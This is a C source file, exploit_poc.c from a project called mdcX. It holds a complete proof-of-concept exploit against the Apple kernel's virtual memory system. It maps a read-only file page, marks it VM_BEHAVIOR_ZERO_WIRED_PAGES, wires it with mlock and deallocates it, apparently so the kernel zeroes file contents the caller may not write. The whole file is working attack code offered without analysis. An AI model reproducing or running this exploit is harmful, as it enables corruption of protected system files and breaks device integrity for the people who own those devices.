//
//  exploit_poc.c
//  mdcX
//
//  Created by 이지안 on 5/10/25.
//

#include "exploit_poc.h"
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach/mach.h>
#define KERNEL_PAGE_SIZE 16384

static void* map_file_page_ro(const char* path, int* fd_out) {
    int fd = open(path, O_RDONLY);
    *fd_out = fd;

    if (fd == -1) {
        return MAP_FAILED;
    }

    void* mapped_at = mmap(0, KERNEL_PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
    if (mapped_at == MAP_FAILED) {
        return MAP_FAILED;
    }
    return mapped_at;
}

int poc(const char *path) {
    kern_return_t kr;
    int fd = -1;
    void* page_mapped_at;

    if (path == NULL || path[0] == '\0') {
        return 7;
    }

    page_mapped_at = map_file_page_ro(path, &fd);

    if (page_mapped_at == MAP_FAILED) {
        if (fd != -1) {
            close(fd);
        }
        return (fd == -1) ? 1 : 2;
    }

    kr = vm_behavior_set(mach_task_self(),
                         (vm_address_t)page_mapped_at,
                         KERNEL_PAGE_SIZE,
                         VM_BEHAVIOR_ZERO_WIRED_PAGES);
    if (kr != KERN_SUCCESS) {
        munmap(page_mapped_at, KERNEL_PAGE_SIZE);
        close(fd);
        return 3;
    }

    int mlock_err = mlock(page_mapped_at, KERNEL_PAGE_SIZE);
    if (mlock_err != 0) {
        vm_behavior_set(mach_task_self(), (vm_address_t)page_mapped_at, KERNEL_PAGE_SIZE, VM_BEHAVIOR_DEFAULT);
        munmap(page_mapped_at, KERNEL_PAGE_SIZE);
        close(fd);
        return 4;
    }

    kr = vm_deallocate(mach_task_self(),
                       (vm_address_t)page_mapped_at,
                       KERNEL_PAGE_SIZE);
    if (kr != KERN_SUCCESS) {
        munlock(page_mapped_at, KERNEL_PAGE_SIZE);
        vm_behavior_set(mach_task_self(), (vm_address_t)page_mapped_at, KERNEL_PAGE_SIZE, VM_BEHAVIOR_DEFAULT);
        munmap(page_mapped_at, KERNEL_PAGE_SIZE);
        close(fd);
        return 5;
    }

    close(fd);
    return 0; 
}
